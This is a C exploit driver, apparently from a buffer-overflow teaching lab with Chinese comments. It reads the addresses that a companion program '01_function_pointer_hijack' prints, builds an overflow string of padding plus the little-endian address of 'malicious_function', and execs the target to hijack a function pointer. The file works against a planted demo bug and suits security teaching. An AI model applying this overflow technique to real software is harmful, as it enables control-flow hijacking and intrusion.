#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    printf("=== 修复函数指针劫持攻击 ===\n\n");
    
    // 1. 先获取当前运行时的所有地址
    printf("1. 获取当前地址...\n");
    FILE *fp = popen("./01_function_pointer_hijack \"short\"", "r");
    if (!fp) {
        printf("无法执行程序获取地址\n");
        return 1;
    }
    
    char line[256];
    unsigned long buffer_addr = 0, func_ptr_addr = 0;
    unsigned long legitimate_addr = 0, malicious_addr = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "buffer地址:")) {
            sscanf(line, "buffer地址: %lx", &buffer_addr);
        }
        if (strstr(line, "func_ptr地址:")) {
            sscanf(line, "func_ptr地址: %lx", &func_ptr_addr);
        }
        if (strstr(line, "legitimate_function地址:")) {
            sscanf(line, "legitimate_function地址: %lx", &legitimate_addr);
        }
        if (strstr(line, "malicious_function地址:")) {
            sscanf(line, "malicious_function地址: %lx", &malicious_addr);
        }
    }
    pclose(fp);
    
    printf("   buffer地址: 0x%lx\n", buffer_addr);
    printf("   func_ptr地址: 0x%lx\n", func_ptr_addr);
    printf("   legitimate: 0x%lx\n", legitimate_addr);
    printf("   malicious: 0x%lx\n", malicious_addr);
    printf("   偏移: %ld 字节\n", func_ptr_addr - buffer_addr);
    printf("\n");
    
    // 2. 验证地址一致性
    printf("2. 验证地址...\n");
    if (legitimate_addr != malicious_addr - 0x20) {
        printf("   注意：函数地址间隔不是0x20字节\n");
        printf("   legitimate: 0x%lx\n", legitimate_addr);
        printf("   malicious: 0x%lx\n", malicious_addr);
        printf("   差值: 0x%lx\n", malicious_addr - legitimate_addr);
    }
    
    // 3. 构造攻击字符串
    printf("3. 构造攻击...\n");
    size_t offset = func_ptr_addr - buffer_addr;
    size_t attack_size = offset + 8;
    
    char *attack = malloc(attack_size + 1);
    memset(attack, 'A', offset);
    
    // 写入恶意地址（小端序）
    for (int i = 0; i < 8; i++) {
        attack[offset + i] = (malicious_addr >> (i * 8)) & 0xFF;
    }
    attack[attack_size] = '\0';
    
    printf("   攻击字符串长度: %zu 字节\n", attack_size);
    printf("   目标地址: 0x%lx\n", malicious_addr);
    
    // 4. 显示攻击字符串
    printf("4. 攻击字符串内容:\n");
    printf("   前32字节: ");
    for (int i = 0; i < 32 && i < attack_size; i++) {
        printf("\\x%02x", (unsigned char)attack[i]);
    }
    printf("\n");
    printf("   地址字节: ");
    for (int i = offset; i < attack_size; i++) {
        printf("\\x%02x", (unsigned char)attack[i]);
    }
    printf("\n\n");
    
    // 5. 执行攻击
    printf("5. 执行攻击...\n");
    char *argv[] = {"./01_function_pointer_hijack", attack, NULL};
    
    // 先检查攻击字符串
    printf("   攻击字符串预览: %.50s\n", attack);
    printf("   实际长度: %zu\n", strlen(attack));
    
    printf("   执行目标程序...\n");
    execv("./01_function_pointer_hijack", argv);
    
    perror("execv失败");
    free(attack);
    return 1;
}
